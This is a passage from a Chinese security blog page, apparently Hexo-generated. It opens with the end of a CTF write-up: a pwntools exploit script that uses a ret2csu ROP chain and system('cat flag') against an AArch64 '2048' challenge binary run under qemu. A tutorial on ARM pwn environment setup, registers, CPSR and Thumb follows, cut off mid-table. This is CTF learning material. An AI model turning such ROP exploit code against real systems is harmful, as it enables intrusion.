class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./20481&#x27;</span>])</span><br><span class="line"><span class="comment">#p=process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./20481&#x27;])</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./20481&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">csu1_addr=<span class="number">0x4020D8</span></span><br><span class="line">csu2_addr=<span class="number">0x4020B8</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu1_addr=<span class="number">0x04020D8</span></span><br><span class="line">csu2_addr=<span class="number">0x04020B8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    payload = p64(csu1_addr) <span class="comment"># ret</span></span><br><span class="line">    payload += p64(csu1_addr) <span class="comment"># x29</span></span><br><span class="line">    payload += p64(csu2_addr) <span class="comment"># x30</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># x19</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># x20</span></span><br><span class="line">    payload += p64(func_addr)  <span class="comment"># x21</span></span><br><span class="line">    payload += p64(arg0)  <span class="comment"># x22 (x0)</span></span><br><span class="line">    payload += p64(arg1)  <span class="comment"># x23 (x1)</span></span><br><span class="line">    payload += p64(arg2)  <span class="comment"># x24 (x2)</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">puts_addr = <span class="number">0x4131B8</span></span><br><span class="line">__libc_start_main_got = <span class="number">0x412f68</span></span><br><span class="line">__libc_start_main_libc = <span class="number">0x5500856ba8</span></span><br><span class="line">puts_got = <span class="number">0x412f88</span></span><br><span class="line">libc_base = __libc_start_main_libc - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.send(p64(system_libc)+<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;sddsdsdsddssssdddsddssddddwsdsdsddssdsdsssdsddddddsssddsddddadssdsdsddddssdddddadsssswssddsdsdssddadddsdddadsdssddsdddswwwdddsddadsdddaasdsddsdsdsddsdsddsdddssdsddsddddwsdsssddsadsdsdddsddsaddwwdsddsssddsdadadsdssasdadswsdaddssssswswdssddssdsdsadwdswwwswdsdsadassddsddddadaddssdasdsdsddsddsssdsdsddddsddddwssdssdswsdssdadadssswddadawwwwwdsdaasdsadsssdsddsdssdddswwwsddssasdwwwswswdddddsdssddddddsdswswswsdsadaasdddaaddsdassdsdasasddwwdddwdsdsddsddwddsadasdssdsswdsdsassddswwdwwswdadddassdsdsddwsddsadsssddsddsddaswasdsdssaddswsswsadsssssassdsdwwsssdsdsdddddsswwdwswsddssddsssssddsdssswssddswsddssddsddsssdswssssssddwddsdwsdswswsddwsdsssdasddadasddadsadsddddswdsasssswswsddsssssdsdwswdswswdsdsswsdsddsssadssdswsaaadsddssdswsswswddsddsdsssdadasdaassdwsdasdaadsdsddsddsadsdssssssddsdadsdsdsaddddsswdasasdddsddsadsdddsddsssdadadsaaddddssdwdddsadwdasddssddsssdsdsdddssaaaaasdsaddddswwdsdasswdwwswdsswsdsdddssswwsddssdwdssdsssssssdadsdadwdssdadddwddsddssdadddddddaadasddsddwdsdadaaaaaaadswds&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[y/n]: &#x27;</span>)</span><br><span class="line">payload=<span class="number">40</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="comment">#payload+=ret2csu(puts_got,__libc_start_main_got,0,0)</span></span><br><span class="line"><span class="comment">#payload+=ret2csu(0x413154,(libc.search(&#x27;/bin/sh&#x27;).next())+libc_base,0,0)</span></span><br><span class="line">payload+=ret2csu(<span class="number">0x413154</span>,<span class="number">0x413154</span>+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;Bye~\n&#x27;)</span></span><br><span class="line"><span class="string">leak_addr=u64(p.recv(3).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="string">success(&quot;leak_addr &gt;&gt; &quot;+hex(leak_addr))</span></span><br><span class="line"><span class="string"># leak_addr &gt;&gt; 0x856ba8</span></span><br><span class="line"><span class="string"># __libc_start_main &gt;&gt; 0x5500856ba8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>初入 ARM pwn，学到了不少 ARM 的知识：</p>
<ul>
<li><code>libc_base</code> 和 <code>proc_base</code> 每次跑都是固定的</li>
<li><code>ret2csu</code> 并不会直接调用 <code>func_addr</code>，而是会调用 <code>func_addr</code> 指向的地址</li>
</ul>
<p>我感觉这个 2048 小游戏很有意思，有时间看看这是这么实现的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">ARM pwn 环境搭建+基础入门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-29 19:51:41" itemprop="dateCreated datePublished" datetime="2022-08-29T19:51:41+08:00">2022-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-30 11:39:42" itemprop="dateModified" datetime="2022-08-30T11:39:42+08:00">2022-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ARM-架构简述"><a href="#ARM-架构简述" class="headerlink" title="ARM 架构简述"></a>ARM 架构简述</h2><p>ARM 架构，过去称作进阶精简指令集机器（Advanced RISC Machine，更早称作艾康精简指令集机器， Acorn RISC Machine），是一个精简指令集（RISC）处理器架构家族，其广泛地使用在许多嵌入式系统设计 </p>
<p>ARM程序，指在ARM系统中正在执行的程序，而非保存在ROM中的bin文件</p>
<p>ARM 和 x86 之间的更多区别是：</p>
<ul>
<li>在 ARM 中，大多数指令都可用于条件执行。</li>
<li>英特尔 x86 和 x86-64 系列处理器使用小端格式</li>
<li>ARM 架构在低版本是小端的，之后，ARM 处理器成为 <strong>BL端</strong>（有允许可切换字节序的设置，由程序状态寄存器 CPSR 的位9 (E位) 控制）</li>
</ul>
<p>一个ARM程序包含3部分：</p>
<ul>
<li>RO段（只读）：RO是程序中的指令和常量</li>
<li>RW段（可读写）：RW是程序中已初始化的变量</li>
<li>ZI段（可读写）：ZI是程序中未初始化的变量</li>
</ul>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>安装 qemu-user：（用于开启虚拟机）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386</span><br></pre></td></tr></table></figure>
<p>安装交叉编译工具 aarch64-linux-gnu-gcc：（推荐）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
<p>安装交叉编译工具链 arm-linux-gcc-4.3.3：（不推荐）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fshare%2Finit%3Fsurl%3DbpEq2Mr">arm-linux-gcc-4.4.3.tar.gz</a></li>
<li>百度云盘，密码：1gtt</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/local/arm_4.4.3</span><br><span class="line">sudo cp -r ./opt/FriendlyARM/toolschain/4.4.3/* /usr/local/arm_4.4.3</span><br><span class="line">gedit ~/.zshrc</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/arm_4.4.3/bin</span><br></pre></td></tr></table></figure>
<p>安装 qemu 内核：（最好不要 <code>apt-get</code> 直接安装，因为没有 <code>qemu-system-aarch64</code>）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-6.2.0.tar.xz</span><br><span class="line">tar xvJf qemu-6.2.0.tar.xz</span><br><span class="line">cd qemu-6.2.0</span><br><span class="line">./configure --target-list=aarch64-softmmu</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>获取 ubuntu-18.04-server-arm64.iso：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/releases/18.04.3/">http://old-releases.ubuntu.com/releases/18.04.3/</a> </li>
</ul>
<p>下载对应架构（aarch64）的 UEFI 固件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://releases.linaro.org/components/kernel/uefi-linaro/16.02/release/qemu64/QEMU_EFI.fd</span><br></pre></td></tr></table></figure>
<p>创建虚拟机硬盘：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create ubuntuimg.img 40G</span><br></pre></td></tr></table></figure>
<p>创建虚拟机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-aarch64 -m 2048 -cpu cortex-a57 -smp 2 -M virt -bios QEMU_EFI.fd -nographic -drive if=none,file=ubuntu-18.04-server-arm64.iso,id=cdrom,media=cdrom -device virtio-scsi-device -device scsi-cd,drive=cdrom -drive if=none,file=ubuntuimg.img,id=hd0 -device virtio-blk-device,drive=hd0</span><br></pre></td></tr></table></figure>
<p>直接回车选择安装 Ubuntu Server：</p>
<p><img src="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1661655283051.png" alt="1661655283051"> </p>
<p>安装成功后，就可以通过如下命令开启 ARM 程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/aarch64-linux-gnu ./[pwn] -g 1234</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./[pwn] -g 1234</span><br></pre></td></tr></table></figure>
<p>最后介绍一下调试方法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch [pwn] </span><br><span class="line">set architecture [Arch-name] # aarch64 or arm</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51760563/article/details/119935101">使用qemu搭建ARM64架构虚拟机</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38406667/article/details/107367971">Ubuntu下arm-linux-gdb的安装</a> </li>
</ul>
<h2 id="数据类型和寄存器"><a href="#数据类型和寄存器" class="headerlink" title="数据类型和寄存器"></a>数据类型和寄存器</h2><p>与高级语言类似，ARM 支持对不同数据类型的操作</p>
<p>我们可以加载（或存储）的数据类型可以是有符号和无符号单词，半字或字节，这些数据类型的扩展名是：</p>
<ul>
<li>-h 或 -sh 表示半字</li>
<li>-b 或 -sb 表示一字节</li>
<li>没有扩展名表示一字</li>
</ul>
<p>有符号数据类型和无符号数据类型之间的区别在于：</p>
<ul>
<li>有符号数据类型 (+s) 可以同时包含正值和负值，因此范围较小</li>
<li>无符号数据类型 (+0) 可以保存较大的正值（包括“零”），但不能保存负值，因此范围更广</li>
</ul>
<p>以下是如何将这些数据类型与加载和存储说明一起使用的一些示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr = Load Word</span><br><span class="line">ldrh = Load unsigned Half Word</span><br><span class="line">ldrsh = Load signed Half Word</span><br><span class="line">ldrb = Load unsigned Byte</span><br><span class="line">ldrsb = Load signed Bytes</span><br><span class="line"></span><br><span class="line">str = Store Word</span><br><span class="line">strh = Store unsigned Half Word</span><br><span class="line">strsh = Store signed Half Word</span><br><span class="line">strb = Store unsigned Byte</span><br><span class="line">strsb = Store signed Byte</span><br></pre></td></tr></table></figure>
<p>寄存器的数量取决于ARM版本</p>
<p>根据ARM参考手册，除了基于 <code>ARMv6-M</code> 和 <code>ARMv7-M</code> 的处理器外，都有30个通用的32位寄存器，其中的 <code>r0-r15</code> 作用如下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>标号</th>
<th>别名</th>
<th style="text-align:left">目的</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R1</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R2</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R3型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R4型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R5</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R6型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R7型</td>
<td>–</td>
<td style="text-align:left">持有系统调用号</td>
</tr>
<tr>
<td>R8型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R9型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R10型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R11型</td>
<td>FP</td>
<td style="text-align:left">帧指针</td>
</tr>
<tr>
<td>R12</td>
<td>IP</td>
<td style="text-align:left">程序内呼叫</td>
</tr>
<tr>
<td>R13</td>
<td>SP</td>
<td style="text-align:left">栈指针</td>
</tr>
<tr>
<td>R14</td>
<td>LR</td>
<td style="text-align:left">链接注册</td>
</tr>
<tr>
<td>R15</td>
<td>PC</td>
<td style="text-align:left">程序计数器</td>
</tr>
<tr>
<td>CPSR</td>
<td>–</td>
<td style="text-align:left">当前程序状态寄存器</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><strong>R0-R12：</strong>可在常见操作期间用于存储临时值、指针（到内存的位置）等<ul>
<li>R0 在算术运算期间可以称为累加器，或者用于存储以前调用的函数的结果</li>
<li>R7 在使用系统调用时变得很有用，因为它存储了 syscall 编号</li>
<li>R11 帮助我们跟踪栈上的边界，作为帧指针（稍后将介绍）</li>
<li>R0-R3：ARM 上的函数调用约定指定函数的前四个参数存储在寄存器 r0-r3 中</li>
</ul>
</li>
<li><strong>R13：SP</strong>（栈指针）栈指针指向栈的顶部<ul>
<li>栈是用于特定于函数的存储的内存区域，当函数返回时，将回收该内存区域</li>
<li>因此，栈指针用于分配栈上的空间，方法是从栈指针中减去我们要分配的值（以字节为单位），换句话说，如果我们想分配一个32位值，我们从栈指针中减去“4”</li>
</ul>
</li>
<li><strong>R14：LR</strong>（链路寄存器）进行函数调用时，链接寄存器将使用内存地址进行更新，该内存地址引用从中启动函数的下一条指令<ul>
<li>这样做允许程序返回到在“子”函数完成后启动“子”函数调用的“父”函数</li>
</ul>
</li>
<li><strong>R15：PC</strong>（程序计数器）程序计数器按执行的指令的大小自动递增<ul>
<li>此大小在 <code>ARM</code> 状态下始终为4个字节，在 <code>THUMB</code> 模式下始终为2个字节</li>
<li>当执行分支指令时，PC保存目标地址，在执行过程中，PC 将当前指令加 8（两条 ARM 指令）的地址存储在 <code>ARM</code> 状态，将当前指令加 4（两条拇指指令）的地址存储在 <code>Thumb(v1)</code> 状态</li>
<li>PS：这与x86不同，在x86中，PC 始终指向要执行的下一条指令</li>
</ul>
</li>
</ul>
<p><strong>CPSR：</strong>显示当前程序状态寄存器（CPSR）的值</p>
<ul>
<li>在此值下，您可以看到标志 &gt;&gt; <code>thumb, fast, interrupt, overflow, carry, zero, and negative</code></li>
<li>这些标志表示 CPSR 寄存器中的某些位，并根据 CPSR 的值进行设置，并在激活时变为 <strong>粗体</strong></li>
<li>N、Z、C 和 V 位与 x86 上 EFLAG 寄存器中的 SF、ZF、CF 和 OF 位相同，它们将用于支持程序集级别的条件和循环中的条件执行：<ul>
<li><strong>N</strong> – 当操作结果为负时设置</li>
<li><strong>Z</strong> – 当操作结果为零时设置</li>
<li><strong>C</strong> – 判断无符号数是否溢出</li>
<li><strong>V</strong> – 判断带符号数是否溢出</li>
</ul>
</li>
</ul>
<p><img src="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1661586815885.png" alt="1661586815885"> </p>
<p>下表展示了 CPSR 中各个位的具体作用：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">Flag</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">N<br>(Negative)</td>
<td style="text-align:left">如果指令结果产生负数，则启用</td>
</tr>
<tr>
<td style="text-align:left">Z<br>(Zero)</td>
<td style="text-align:left">如果指令的结果产生零值，则启用</td>
</tr>
<tr>
<td style="text-align:left">C<br>(Carry)</td>
<td style="text-align:left">如果指令的结果产生一个需要完全表示第 33 位的值，则启用该值</td>
</tr>
<tr>
<td style="text-align:left">V<br>(Overflow)</td>
<td style="text-align:left">如果指令的结果产生的值不能用 32 位 2 的补码表示，则启用此选项</td>
</tr>
<tr>
<td style="text-align:left">E<br>(Endian-bit)</td>
<td style="text-align:left">ARM可以在小端序或大端中进行切换，对于小字节序，此位设置为“0”，对于大字节序模式，此位设置为“1”</td>
</tr>
<tr>
<td style="text-align:left">T<br>(Thumb-bit)</td>
<td style="text-align:left">如果您处于 Thumb 状态，则设置此位，并在您处于 ARM 状态时被禁用</td>
</tr>
<tr>
<td style="text-align:left">M<br>(Mode-bits)</td>
<td style="text-align:left">这些位指定当前权限模式（USR、SVC 等）</td>
</tr>
<tr>
<td style="text-align:left">J<br>(Jazelle)</td>
<td style="text-align:left">第三个执行状态，允许某些 ARM 处理器在硬件中执行 Java 字节码</td>
</tr>
</tbody>
</table>
</div>
<h2 id="ARM-amp-THUMB"><a href="#ARM-amp-THUMB" class="headerlink" title="ARM &amp; THUMB"></a>ARM &amp; THUMB</h2><p>ARM 处理器有两种主要状态，它们可以在其中运行（这里不算Jazelle）：ARM 和 Thumb</p>
<ul>
<li>Thumb 是 ARM 体系结构中一种 <strong>16位的指令集</strong></li>
<li>Thumb 指令集可以看作是 ARM 指令压缩形式的子集，它是为减小代码量而提出，具有16bit的代码密度</li>
</ul>
<p>这些状态与权限级别无关，例如，在 SVC 模式下运行的代码可以是 ARM 或 Thumb，这两种状态之间的主要区别在于指令集，其中 ARM 状态下的指令始终为32位，而 Thumb 状态的指令为16位（但可以是32位）</p>
<p>了解何时以及如何使用 Thumb 对于我们的 ARM 漏洞利用开发目的尤为重要，在编写 ARM 外壳代码时，我们需要删除 NULL 字节，并使用 16 位 Thumb 指令而不是 32 位 ARM 指令来降低拥有它们的机会</p>
<p>如前所述，有不同的 Thumb 版本，不同的命名只是为了将它们彼此区分开来：（处理器本身将始终将其称为 Thumb）</p>
<ul>
<li>Thumb-1（16 位指令）：用于 ARMv6 和早期架构</li>
<li>Thumb-2（16 位和 32 位指令）：通过添加更多指令并允许它们为 16 位或 32 位宽（ARMv6T2、ARMv7）来扩展 Thumb-1</li>
<li>ThumbEE：包括一些针对动态生成的代码（在执行前或执行期间在设备上编译的代码）的一些更改和添加</li>
</ul>
<p>ARM 和 Thumb 之间的区别：</p>
<ul>
<li>条件执行：<ul>
<li>ARM 状态下的所有指令都支持条件执行，某些 ARM 处理器版本允许使用 IT 指令在 Thumb 中执行条件（条件执行导致更高的代码密度，因为它减少了要执行的指令数量，并减少了昂贵的分支指令的数量）</li>
</ul>
</li>
<li>32 位 ARM 和 Thumb 指令：<ul>
<li>32 位 Thumb 指令具有 .w 后缀</li>
<li>32 位 ARM 指令没有</li>
</ul>
</li>
<li>桶形移位器：<ul>
<li>是另一个独特的 ARM 模式功能，它可用于将多个指令缩小为一个</li>
</ul>
</li>
</ul>
<p>要切换处理器执行的状态，必须满足以下两个条件之一：</p>
<ul>
<li>我们可以使用分支指令BX（分支和交换）或BLX（分支，链路和交换），并将目标寄存器的最低有效位设置为1<ul>
<li>这可以通过将1添加到偏移量（如0x5530 + 1）来实现</li>
<li>您可能会认为这会导致对齐问题，因为指令是 2 字节或 4 字节对齐的</li>
<li>不够都这不是问题，因为处理器将忽略最低有效位</li>
</ul>
</li>
<li>我们知道，如果当前程序状态寄存器中的 T 位已设置，则处于 Thumb 模式</li>
</ul>
<h2 id="ARM-指令集"><a href="#ARM-指令集" class="headerlink" title="ARM 指令集"></a>ARM 指令集</h2><p>汇编语言由指令组成，这些指令是主要的构建块，ARM 指令后面通常跟一个或两个操作数，通常使用以下模板： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br></pre></td></tr></table></figure>
<p>由于 ARM 指令集的灵活性，并非所有指令都使用模板中提供的所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC - 指令的简称(助记符)</span><br><span class="line">&#123;S&#125; - 可选后缀,如果指定了S,则条件标志会根据操作结果更新</span><br><span class="line">&#123;condition&#125; - 执行指令需要满足的条件</span><br><span class="line">&#123;Rd&#125; - 用于存储指令结果的寄存器(目标)</span><br><span class="line">Operand1 - 第一个操作数,寄存器或立即数</span><br><span class="line">Operand2 - 第二个(灵活的)操作数,可以是立即数(数字)或带有可选移位的寄存器</span><br></pre></td></tr></table></figure>
<p>虽然 MNEMONIC、S、Rd 和 Operand1 字段是直截了当的，但条件和 Operand2 字段需要进一步澄清：</p>
<ul>
<li>条件字段与 CPSR 寄存器的值紧密相关，或者更确切地说，与寄存器中特定位的值紧密相关</li>
<li>Operand2 被称为灵活的操作数，因为我们可以以各种形式使用它：<ul>
<li>作为即时值（具有有限的值集）</li>
<li>寄存器</li>
<li>以移位寄存器</li>
</ul>
</li>
<li>例如，我们可以将这些表达式用作操作数 2：  </li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#123 - 立即值(具有有限的一组值)</span></span><br><span class="line"><span class="attribute">Rx</span> - 寄存器 x(如 R<span class="number">1</span>、R<span class="number">2</span>、R<span class="number">3</span> ...)</span><br><span class="line"><span class="attribute">Rx</span>, ASR n - 寄存器 x 算术右移 n 位 (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="attribute">Rx</span>, LSL n - 寄存器 x 逻辑左移 n 位 (<span class="number">0</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="attribute">Rx</span>, LSR n - 寄存器 x 逻辑右移 n 位 (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="attribute">Rx</span>, ROR n - 寄存器 x 右移 n 位 (<span class="number">1</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="attribute">Rx</span>, RRX - 寄存器 x 右移一位,扩展</span><br></pre></td></tr></table></figure>
<ul>
<li>作为不同类型说明的快速示例，让我们看一下以下列表：</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ADD</span> R<span class="number">0</span>, R<span class="number">1</span>, R<span class="number">2</span> - 将 R<span class="number">1</span> (Operand<span class="number">1</span>) 和 R<span class="number">2</span> (Operand<span class="number">2</span> 的寄存器形式) 的内容相加并将结果存储到 R<span class="number">0</span> (Rd)</span><br><span class="line"><span class="attribute">ADD</span> R<span class="number">0</span>, R<span class="number">1</span>, #<span class="number">2</span> - 将 R<span class="number">1</span> (Operand<span class="number">1</span>) 的内容与值 <span class="number">2</span> (Operand<span class="number">2</span> 的立即数形式) 相加并将结果存储到 R<span class="number">0</span> (Rd)</span><br><span class="line"><span class="attribute">MOVLE</span> R<span class="number">0</span>, #<span class="number">5</span> - 仅当满足条件 LE (小于或等于)时,将数字 <span class="number">5</span> (操作数 <span class="number">2</span>,因为编译器将其视为 MOVLE R<span class="number">0</span>, R<span class="number">0</span>, #<span class="number">5</span>) 移动到 R<span class="number">0</span>(Rd)</span><br><span class="line"><span class="attribute">MOV</span> R<span class="number">0</span>, R<span class="number">1</span>, LSL #<span class="number">1</span> - 将 R<span class="number">1</span> 的内容(操作数 <span class="number">2</span> 采用逻辑左移的寄存器形式)左移一位到 R<span class="number">0</span>(Rd),因此,如果 R<span class="number">1</span> 的值为 <span class="number">2</span>,它会左移一位并变为 <span class="number">4</span>,然后将 <span class="number">4</span> 移至 R<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>作为快速摘要，让我们看一下我们将在以后的示例中使用的最常见的说明</p>
<div class="table-container">
<table>
<thead>
